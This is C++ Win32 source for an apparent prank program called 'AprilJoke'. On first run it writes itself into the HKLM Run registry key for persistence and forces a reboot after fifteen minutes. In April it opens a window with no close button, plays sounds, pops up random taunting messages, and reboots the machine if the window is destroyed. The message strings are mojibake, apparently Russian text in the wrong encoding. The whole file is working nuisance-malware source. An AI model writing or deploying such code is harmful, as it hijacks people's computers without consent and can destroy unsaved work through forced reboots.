// AprilJoke.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"

UINT	uTimerStartup,
		uTimerReboot,
		uTimerSounding,
		uTimerMessaging;

HINSTANCE hInst;
PCHAR lpszClass="AprilJoke V1.1";

VOID CALLBACK OnTimerStartup(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerReboot(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerSounding(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerMessaging(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
LRESULT CALLBACK WinProc (HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	//MessageBox(NULL,"Hello","1st April",MB_OK);
	
	hInst=hInstance;
	HKEY hKey1;
	SYSTEMTIME stTime;
	char dir[180];
	LONG j;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",&hKey1)!=ERROR_SUCCESS)
	{
		MessageBeep(MB_OK);
		RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",&hKey1);
		SHSetValue (HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",
					"IsInstalled",REG_SZ,"Ok",9);
		j=GetCurrentDirectory(180,dir);
		j+=sprintf(dir+j,"\\AprilJoke.exe");
		SHSetValue (HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				"Joke",REG_SZ,dir,j);
		MessageBox(NULL,"����������� � �������!","Something Strange...",MB_OK);
		uTimerReboot=SetTimer(NULL,NULL,15*60*1000,OnTimerReboot);
	}
	else
	{
		GetSystemTime (&stTime);
		if (stTime.wMonth==4 && stTime.wDay<29)  //���������!!!
			uTimerStartup=SetTimer(NULL,NULL,1000,OnTimerStartup);
		else
			return 0;
	}
	
	MSG msg;
	while (GetMessage(&msg,NULL,0L,0L))
	{
		DispatchMessage(&msg);
	}

	MessageBox (NULL,"��� �� �������, ������?","������ ��� �� �����!",MB_OK);
	ExitWindowsEx(EWX_REBOOT,0);
	return 0;
}

VOID CALLBACK OnTimerReboot(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	KillTimer(NULL,uTimerReboot);
	ExitWindowsEx(EWX_REBOOT,0);
}

VOID CALLBACK OnTimerStartup(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	KillTimer(NULL,uTimerStartup);
	SetTimer (NULL,NULL,5*60*1000,OnTimerSounding);
	SetTimer (NULL,NULL,15*60*1000,OnTimerMessaging);
	
	WNDCLASS wc;
	wc.cbClsExtra=0;
	wc.cbWndExtra=0;
	wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
	wc.hCursor=LoadCursor(NULL,IDC_ARROW);
	wc.hIcon=LoadIcon(NULL,IDI_APPLICATION);
	wc.hInstance=hInst;
	wc.lpfnWndProc=WinProc;
	wc.lpszClassName="APRILCLASS";
	wc.lpszMenuName=NULL;
	wc.style=CS_VREDRAW | CS_HREDRAW |CS_NOCLOSE;
	RegisterClass(&wc);

	HWND hw=CreateWindow("APRILCLASS","Hello",WS_OVERLAPPEDWINDOW,0,0,CW_USEDEFAULT,CW_USEDEFAULT,
			NULL,NULL,hInst,NULL);	
}

VOID CALLBACK OnTimerSounding(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	PlaySound ("#101",hInst,SND_RESOURCE);
}

VOID CALLBACK OnTimerMessaging(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	int r;
	while (1)
	{
		r=rand();
		r%=100;
		if (r<=33) break;
	}

	char *text;
	switch (r)
	{
	case 0: text="��, ����, ������!!!";break;
	case 1: text="������,  �����  �����...";break;
	case 2: text="���� - ��� ������!";break;
	case 3: text="H� ������!";break;
	case 4: text="���� �� �� ����, ����� �������� �� ������ ���� ������!";break;
	case 5: text="� �� �������������� �������� �������...";break;
	case 6: text="���, ������� ���������� �������?";break;
	case 7: text="H������ �������,  ���� ������� � ���� ������ � ������.";break;
	case 8: text="H���, ���� ���������...";break;
	case 9: text="������ ������������ ��-������...";break;
	case 10: text="�  ������  �������  ���������� �������.  ���� ��� � ��������� �� ������������.";break;
	case 11: text="�� �� ������ �������.  ����� ������� ��������� ���������� �������� ������ �������� � ���������� ������������ ������, ���������� ������ � ��������.";break;
	case 12: text="H� ��� �� ����� �������� ������...";break;
	case 13: text="��� �� ������?";break;
	case 14: text="������ �������. H� �������-��! �����, ��������!";break;
	case 15: text="����� �� �������. ������ ������ � ���� - ������ � ����";break;
	case 16: text="��� ��� ��� �� ���������������� �������?";break;
	case 17: text="��.";break;
	case 18: text="���������� ������. ���� �� ������, ���������.";break;
	case 19: text="������ ����� � ������ �������.";break;
	case 20: text="����, ��� �����������? ������ ��� ����������� ��������?";break;
	case 21: text="� ��� �� �����?";break;
	case 22: text="�-�, � ��� �����!";break;
	case 23: text="H� ���,  � ��� � ����!";break;
	case 24: text="���������,  ��� ����������� ����� '�����' ��� ���?";break;
	case 25: text="�  ��  �������  ���������� - � ��� ������� ����!";break;
	case 26: text="� �� � �� ����,  ��� �� ������ �� ������, ������ ����!";break;
	case 27: text="H� ����������, �� ����� ��������� ���� ������� �����.";break;
	case 28: text="���� ���� � ����!";break;
	case 29: text="����, ��� ������! � �� ����� ������ ��������.";break;
	case 30: text="�� �� �������� - ������� � �����, �������...";break;
	case 31: text="UT = Rullez ! ! !";break;
	case 32: text="׸ ����� ?";break;
	default: text="���������� ������ ������, ��� ������.";break;
	}
	MessageBox(NULL,text,"������ ������� :)",MB_OK);
}

LRESULT CALLBACK WinProc (HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_DESTROY:

	case WM_QUIT:
		{		
			MessageBox (NULL,"��� �� �������, ������?","������ ��� �� �����!",MB_OK);
			ExitWindowsEx(EWX_REBOOT,0);
		}
		break;
	}
	return DefWindowProc(hWnd,uMsg,wParam,lParam);
}
